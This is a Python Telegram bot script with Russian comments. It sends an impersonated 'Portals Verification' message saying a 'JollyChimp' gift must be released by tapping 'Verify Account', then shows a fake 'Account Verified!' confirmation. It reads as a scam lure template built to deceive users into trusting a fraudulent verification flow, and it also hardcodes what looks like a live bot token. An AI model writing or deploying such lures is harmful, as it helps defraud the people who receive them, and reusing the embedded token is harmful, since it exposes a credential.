import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ТОКЕН БОТА
TOKEN = "8868277445:AAEPYSE-uoej11anci9jpiaoDYsOqL_-tps"

# Ссылка на аватарку
PHOTO_URL = "https://i.postimg.cc/4KGSwvT6/IMG-4158.jpg"

# Функция для команды /start
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Кнопка Verify Account
    keyboard = [
        [InlineKeyboardButton("✅ Verify Account", callback_data='verify')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    # Текст сообщения
    message = (
        f"🎩 *Portals Verification*\n\n"
        f"**Final Verification Required: Claim Your Gift**\n\n"
        f"Your scheduled delivery of *JollyChimp #20,203* is tagged for last-mile review. "
        f"To preserve platform safety and block fraudulent claim attempts, confirming "
        f"your active session is required before the gift can be released.\n\n"
        f"A single tap below and the asset is on its way."
    )
    
    # Отправляем фото с подписью и кнопкой
    await update.message.reply_photo(
        photo=PHOTO_URL,
        caption=message,
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )

# Обработчик нажатия кнопки
async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == 'verify':
        await query.edit_message_caption(
            caption="✅ *Account Verified!*\n\n"
                    "Your JollyChimp #20,203 is on its way! 🎩✨\n\n"
                    "---\n"
                    "**FULL WORK, НОВЫЙ БОТ УЖЕ В ЧАТЕ**",
            parse_mode='Markdown'
        )
        await query.edit_message_reply_markup(reply_markup=None)

# Команда /help
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🤖 *Бот для верификации*\n\n"
        "Используй /start для начала работы\n"
        "Нажми 'Verify Account' для подтверждения",
        parse_mode='Markdown'
    )

def main():
    application = Application.builder().token(TOKEN).build()
    
    # Регистрируем обработчики
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CallbackQueryHandler(button_callback))
    
    logger.info("🚀 Бот запущен и работает!")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()
